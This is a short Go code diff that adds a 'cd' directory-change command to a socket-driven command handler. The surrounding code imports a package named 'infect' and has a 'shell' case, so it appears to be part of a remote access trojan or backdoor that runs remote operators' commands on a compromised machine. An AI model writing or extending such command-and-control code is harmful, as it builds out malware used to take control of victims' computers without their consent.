@@ -7,6 +7,7 @@ import(
   "io"
   "fmt"
   "os/exec"
+  "os"
 
   "./infect"
   "./debug"
@@ -99,6 +100,21 @@ func handleCMD(token string, sock socket.Socket){
         sock.Write(fmt.Sprintf("%v", err))
       } else {
         sock.Write(fmt.Sprintln(fileName))
+      }
+
+    case "cd":
+      cmds := strings.Split(cmd, "cd")
+      cmds[1] = strings.TrimSpace(cmds[1])
+      if cmds[1] == "" {
+        sock.Write("Insufficient argument.")
+      } else {
+        err = os.Chdir(cmds[1])
+        if err != nil {
+          debug.Println(err)
+          sock.Write(fmt.Sprintf("Error: %v", err))
+        } else {
+          sock.Write("Switch to " + cmds[1])
+        }
       }
 
     case "shell":
